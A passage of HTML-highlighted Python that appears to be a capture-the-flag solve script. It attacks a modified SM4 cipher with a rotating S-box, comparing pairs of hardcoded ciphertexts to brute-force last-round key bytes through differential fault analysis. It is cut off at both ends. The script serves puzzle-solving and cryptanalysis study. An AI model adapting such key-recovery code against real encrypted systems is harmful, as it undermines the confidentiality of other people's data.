class="number">86</span>, <span class="number">247</span>, <span class="number">96</span>, <span class="number">179</span>, <span class="number">57</span>, <span class="number">135</span>, <span class="number">106</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">202</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">155</span>, <span class="number">156</span>, <span class="number">83</span>, <span class="number">132</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">171</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">166</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">104</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">142</span>, <span class="number">211</span>, <span class="number">213</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">234</span>, <span class="number">182</span>, <span class="number">203</span>, <span class="number">217</span>, <span class="number">64</span>, <span class="number">185</span>, <span class="number">163</span>, <span class="number">73</span>, <span class="number">45</span>, <span class="number">41</span>, <span class="number">118</span>, <span class="number">103</span>, <span class="number">134</span>, <span class="number">186</span>, <span class="number">230</span>, <span class="number">241</span>, <span class="number">250</span>, <span class="number">52</span>, <span class="number">207</span>, <span class="number">162</span>, <span class="number">124</span>, <span class="number">140</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">228</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">47</span>, <span class="number">176</span>, <span class="number">239</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">216</span>, <span class="number">225</span>, <span class="number">188</span>, <span class="number">137</span>, <span class="number">160</span>, <span class="number">80</span>, <span class="number">231</span>, <span class="number">102</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">91</span>, <span class="number">59</span>, <span class="number">23</span>, <span class="number">240</span>, <span class="number">105</span>, <span class="number">153</span>, <span class="number">177</span>, <span class="number">138</span>, <span class="number">219</span>, <span class="number">174</span>, <span class="number">123</span>, <span class="number">36</span>, <span class="number">159</span>, <span class="number">76</span>, <span class="number">21</span>, <span class="number">56</span>, <span class="number">242</span>, <span class="number">61</span>, <span class="number">107</span>, <span class="number">133</span>, <span class="number">143</span>, <span class="number">154</span>, <span class="number">130</span>, <span class="number">233</span>, <span class="number">15</span>, <span class="number">145</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">189</span>, <span class="number">120</span>, <span class="number">251</span>, <span class="number">236</span>, <span class="number">117</span>, <span class="number">208</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">168</span>, <span class="number">74</span>, <span class="number">229</span>, <span class="number">54</span>, <span class="number">2</span>, <span class="number">39</span>, <span class="number">127</span>, <span class="number">29</span>, <span class="number">253</span>, <span class="number">141</span>, <span class="number">71</span>, <span class="number">205</span>, <span class="number">40</span>, <span class="number">144</span>, <span class="number">27</span>]]</span><br><span class="line"><span class="variable constant_">WDB</span>=<span class="variable constant_">DB</span>[<span class="number">2</span>:]+<span class="variable constant_">DB</span>[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">i2l = lambda <span class="attr">x</span>: [(x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>, (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, x &amp; <span class="number">0xff</span>]</span><br><span class="line">l2i = lambda <span class="attr">x</span>: (x[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>)|(x[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>)|(x[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>)|x[<span class="number">3</span>]</span><br><span class="line">rotl32 = lambda x, <span class="attr">n</span>: ((x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>) | ((x &gt;&gt; (<span class="number">32</span>-n)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">rotl8 = lambda x, <span class="attr">n</span>: ((x &lt;&lt; n) &amp; <span class="number">0xff</span>) | ((x &gt;&gt; (<span class="number">8</span>-n)) &amp; <span class="number">0xff</span>)</span><br><span class="line">xor = lambda x, <span class="attr">y</span>: <span class="title function_">list</span>(<span class="title function_">map</span>(lambda a, <span class="attr">b</span>: a ^ b, x, y))</span><br><span class="line">pad = lambda data, block=<span class="number">16</span>: data + [<span class="number">16</span> - <span class="title function_">len</span>(data) % block]*(<span class="number">16</span> - <span class="title function_">len</span>(data) % block)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">SM4</span>_BOXES_TABLE = [</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>,</span><br><span class="line">    <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>, <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>, <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>, <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>, <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>, <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>, <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>, <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>, <span class="number">0x0a</span>, <span class="number">0xc1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="title class_">SM4</span>_FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line"></span><br><span class="line"><span class="title class_">SM4</span>_CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dance</span>_Box=<span class="variable constant_">DB</span></span><br><span class="line">def <span class="title function_">dance</span>():</span><br><span class="line">    <span class="variable language_">global</span> <span class="title class_">Dance</span>_Box</span><br><span class="line">    <span class="title class_">Dance</span>_Box = <span class="title class_">Dance</span>_Box[<span class="number">2</span>:]+<span class="title class_">Dance</span>_Box[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">def <span class="title function_">round_key</span>(k):</span><br><span class="line">    ar = [<span class="title class_">SM4</span>_BOXES_TABLE[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">i2l</span>(k)]</span><br><span class="line">    b = <span class="title function_">l2i</span>(ar)</span><br><span class="line">    <span class="keyword">return</span> b ^ <span class="title function_">rotl32</span>(b, <span class="number">13</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">expand_key</span>(master_key):</span><br><span class="line">    master_key = <span class="title function_">list</span>(master_key)</span><br><span class="line">    <span class="variable constant_">MK</span> = [<span class="title function_">l2i</span>(master_key[:<span class="number">4</span>]), <span class="title function_">l2i</span>(master_key[<span class="number">4</span>:<span class="number">8</span>]),\</span><br><span class="line">           <span class="title function_">l2i</span>(master_key[<span class="number">8</span>:<span class="number">12</span>]), <span class="title function_">l2i</span>(master_key[<span class="number">12</span>:])]</span><br><span class="line">    k = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">    k[<span class="number">0</span>:<span class="number">4</span>] = <span class="title function_">xor</span>(<span class="variable constant_">MK</span>, <span class="title class_">SM4</span>_FK)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">32</span>):</span><br><span class="line">        k[i + <span class="number">4</span>] = k[i] ^ (<span class="title function_">round_key</span>(k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>] ^ <span class="title class_">SM4</span>_CK[i]))</span><br><span class="line">    <span class="keyword">return</span> k[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">def <span class="title function_">tfunc</span>(bk):</span><br><span class="line">    ar = [<span class="title class_">SM4</span>_BOXES_TABLE[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">i2l</span>(bk)]</span><br><span class="line">    b = <span class="title function_">l2i</span>(ar)</span><br><span class="line">    <span class="keyword">return</span> b ^ <span class="title function_">rotl32</span>(b, <span class="number">2</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">10</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">18</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">invtfunc</span>(b):</span><br><span class="line">    b=<span class="title function_">d</span>(b)</span><br><span class="line">    ar=<span class="title function_">i2l</span>(b)</span><br><span class="line">    bk = [<span class="title class_">SM4</span>_BOXES_TABLE.<span class="title function_">index</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ar]</span><br><span class="line">    bk=<span class="title function_">l2i</span>(bk)</span><br><span class="line">    <span class="keyword">return</span> bk</span><br><span class="line"></span><br><span class="line">def <span class="title function_">pfunc</span>(bk):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">        sbox = <span class="title class_">Dance</span>_Box[i]</span><br><span class="line">        ar = [sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">i2l</span>(bk[i])]</span><br><span class="line">        b = [<span class="title function_">rotl8</span>(ar[i], i+<span class="number">3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>)]</span><br><span class="line">        res.<span class="title function_">append</span>(<span class="title function_">l2i</span>(b))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">def <span class="title function_">invpfunc</span>(res,D=<span class="variable constant_">DB</span>):</span><br><span class="line">    bk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">        sbox = D[i]</span><br><span class="line">        b=<span class="title function_">i2l</span>(res[i])</span><br><span class="line">        ar=[<span class="title function_">rotl8</span>(b[j], <span class="number">8</span>-(j+<span class="number">3</span>)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>)]</span><br><span class="line">        bki=[sbox.<span class="title function_">index</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ar]</span><br><span class="line">        bk.<span class="title function_">append</span>(<span class="title function_">l2i</span>(bki))</span><br><span class="line">    <span class="keyword">return</span> bk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">one_round</span>(bk, rk, dt):</span><br><span class="line">    out = []</span><br><span class="line">    buf = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">    buf[:<span class="number">4</span>] = [<span class="title function_">l2i</span>(bk[:<span class="number">4</span>]), <span class="title function_">l2i</span>(bk[<span class="number">4</span>:<span class="number">8</span>]), <span class="title function_">l2i</span>(bk[<span class="number">8</span>:<span class="number">12</span>]), <span class="title function_">l2i</span>(bk[<span class="number">12</span>:])]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> dt == <span class="attr">i</span>:</span><br><span class="line">            <span class="title function_">dance</span>()</span><br><span class="line">        buf[i+<span class="number">4</span>] = buf[i] ^ <span class="title function_">tfunc</span>(buf[i+<span class="number">1</span>]^buf[i+<span class="number">2</span>]^buf[i+<span class="number">3</span>]^rk[i])</span><br><span class="line">        buf[i+<span class="number">1</span>:i+<span class="number">5</span>] = <span class="title function_">pfunc</span>(buf[i+<span class="number">1</span>:i+<span class="number">5</span>])</span><br><span class="line">    <span class="title function_">dance</span>()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">        out += <span class="title function_">i2l</span>(buf[-<span class="number">1</span>-_])</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">crypt_ecb</span>(pt, key, dance_time=-<span class="number">1</span>):</span><br><span class="line">    pt = <span class="title function_">pad</span>(<span class="title function_">list</span>(pt))</span><br><span class="line">    rk = <span class="title function_">expand_key</span>(key)</span><br><span class="line">    block = [pt[<span class="attr">_</span>:_+<span class="number">16</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0</span>, <span class="title function_">len</span>(pt), <span class="number">16</span>)]</span><br><span class="line">    result = b<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="attr">block</span>:</span><br><span class="line">        result += <span class="title function_">bytes</span>(<span class="title function_">one_round</span>(i, rk, dt=dance_time))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t=lambda <span class="attr">b</span>:b ^ <span class="title function_">rotl32</span>(b, <span class="number">2</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">10</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">18</span>) ^ <span class="title function_">rotl32</span>(b, <span class="number">24</span>)</span><br><span class="line">d=lambda <span class="attr">b</span>:<span class="title function_">rotl32</span>(b,<span class="number">30</span>)^<span class="title function_">rotl32</span>(b,<span class="number">24</span>)^<span class="title function_">rotl32</span>(b,<span class="number">22</span>)^<span class="title function_">rotl32</span>(b,<span class="number">18</span>)^<span class="title function_">rotl32</span>(b,<span class="number">16</span>)^<span class="title function_">rotl32</span>(b,<span class="number">14</span>)^<span class="title function_">rotl32</span>(b,<span class="number">12</span>)^<span class="title function_">rotl32</span>(b,<span class="number">8</span>)^<span class="title function_">rotl32</span>(b,<span class="number">4</span>)^<span class="title function_">rotl32</span>(b,<span class="number">2</span>)^b</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ct = [<span class="string">&#x27;e5a304ea2ffc53a1ff94337c2b2ae5368b46c6da3cc37f8438eb967b29249d4e&#x27;</span>, <span class="string">&#x27;6733baa353d4cfc4ff94337c58dc7fdbd6df83f4fbf6e5e838eb967b98d7e8d3&#x27;</span>, <span class="string">&#x27;e77dbfe7868701fbd7072e6358dc7fdba067d296707bad1b0f4541dc98d7e8d3&#x27;</span>, <span class="string">&#x27;54b772d532556d5573a6ab667c9ff76857b5efc3b62130668e46a79b163138e4&#x27;</span>, <span class="string">&#x27;47339f6738dd9f4c9581fbd496dde76ea320d95b457e0373cddb910acc41fe35&#x27;</span>]    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">100</span>):</span><br><span class="line">#    a=<span class="title function_">getrandbits</span>(<span class="number">32</span>)</span><br><span class="line">#    b=<span class="title function_">getrandbits</span>(<span class="number">32</span>)</span><br><span class="line">#    <span class="title function_">assert</span>(<span class="title function_">tfunc</span>(a)^<span class="title function_">tfunc</span>(b)==<span class="title function_">tfunc</span>(a^b))</span><br><span class="line"></span><br><span class="line">ct0t=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">0</span>][:<span class="number">32</span>])</span><br><span class="line">ct0f=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">1</span>][:<span class="number">32</span>])</span><br><span class="line">#ct1t=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">0</span>][<span class="number">32</span>:])</span><br><span class="line">#ct1f=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">1</span>][<span class="number">32</span>:])</span><br><span class="line">buft=[<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">buff=[<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">    buft[-i-<span class="number">1</span>]=<span class="title function_">l2i</span>(ct0t[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line">    buff[-i-<span class="number">1</span>]=<span class="title function_">l2i</span>(ct0f[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line">buft[<span class="number">32</span>:]=<span class="title function_">invpfunc</span>(buft[<span class="number">32</span>:],<span class="variable constant_">WDB</span>)</span><br><span class="line">buff[<span class="number">32</span>:]=<span class="title function_">invpfunc</span>(buff[<span class="number">32</span>:],<span class="variable constant_">WDB</span>)</span><br><span class="line"></span><br><span class="line">#<span class="title function_">assert</span>(<span class="title function_">invpfunc</span>(buft[<span class="number">31</span>:<span class="number">35</span>],<span class="variable constant_">DB</span>)[<span class="number">1</span>:]==<span class="title function_">invpfunc</span>(buff[<span class="number">31</span>:<span class="number">35</span>],<span class="variable constant_">WDB</span>)[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">dt=<span class="title function_">i2l</span>(<span class="title function_">d</span>(buff[<span class="number">35</span>]^buft[<span class="number">35</span>]))</span><br><span class="line"><span class="title function_">print</span>(dt)</span><br><span class="line">dt=<span class="title function_">i2l</span>(<span class="title function_">d</span>(buff[<span class="number">35</span>])^<span class="title function_">d</span>(buft[<span class="number">35</span>]))</span><br><span class="line"><span class="title function_">print</span>(dt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rkl0=[<span class="title function_">set</span>() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>((dt))</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">i2l</span>(buff[<span class="number">32</span>]^buft[<span class="number">32</span>]))</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">i2l</span>(buff[<span class="number">33</span>]^buft[<span class="number">33</span>]))</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">i2l</span>(buff[<span class="number">34</span>]^buft[<span class="number">34</span>]))</span><br><span class="line"></span><br><span class="line">ict=<span class="title function_">i2l</span>(buft[<span class="number">32</span>]^buft[<span class="number">34</span>]^buft[<span class="number">33</span>])</span><br><span class="line">icf=<span class="title function_">i2l</span>(buff[<span class="number">32</span>]^buff[<span class="number">34</span>]^buff[<span class="number">33</span>])</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(ict,icf)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="title class_">SM4</span>_BOXES_TABLE[ict[i]^guess]^<span class="title class_">SM4</span>_BOXES_TABLE[icf[i]^guess]==dt[i]:</span><br><span class="line">            rkl0[i].<span class="title function_">add</span>(guess)</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rkl0)            </span><br><span class="line"></span><br><span class="line">rkl0_1=<span class="title function_">copy</span>(rkl0)</span><br><span class="line"><span class="title function_">print</span>()</span><br><span class="line">#ct0t=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">0</span>][:<span class="number">32</span>])</span><br><span class="line">#ct0f=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">1</span>][:<span class="number">32</span>])</span><br><span class="line">ct0t=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">0</span>][<span class="number">32</span>:])</span><br><span class="line">ct0f=bytes.<span class="title function_">fromhex</span>(ct[<span class="number">1</span>][<span class="number">32</span>:])</span><br><span class="line">buft=[<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">buff=[<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">    buft[-i-<span class="number">1</span>]=<span class="title function_">l2i</span>(ct0t[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line">    buff[-i-<span class="number">1</span>]=<span class="title function_">l2i</span>(ct0f[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line">buft[<span class="number">32</span>:]=<span class="title function_">invpfunc</span>(buft[<span class="number">32</span>:],<span class="variable constant_">WDB</span>)</span><br><span class="line">buff[<span class="number">32</span>:]=<span class="title function_">invpfunc</span>(buff[<span class="number">32</span>:],<span class="variable constant_">WDB</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">assert</span>(<span class="title function_">invpfunc</span>(buft[<span class="number">31</span>:],<span class="variable constant_">DB</span>)[<span class="number">1</span>:]==<span class="title function_">invpfunc</span>(buff[<span class="number">31</span>:],<span class="variable constant_">WDB</span>)[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">dt=<span class="title function_">i2l</span>(<span class="title function_">d</span>(buff[<span class="number">35</span>]^buft[<span class="number">35</span>]))</span><br><span class="line"></span><br><span class="line">rkl0=[<span class="title function_">set</span>() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>((dt))</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">i2l</span>(buff[<span class="number">32</span>]^buft[<span class="number">32</span>]))</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">i2l</span>(buff[<span class="number">33</span>]^buft[<span class="number">33</span>]))</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">i2l</span>(buff[<span class="number">34</span>]^buft[<span class="number">34</span>]))</span><br><span class="line"></span><br><span class="line">ict=<span class="title function_">i2l</span>(buft[<span class="number">32</span>]^buft[<span class="number">34</span>]^buft[<span class="number">33</span>])</span><br><span class="line">icf=<span class="title function_">i2l</span>(buff[<span class="number">32</span>]^buff[<span class="number">34</span>]^buff[<span 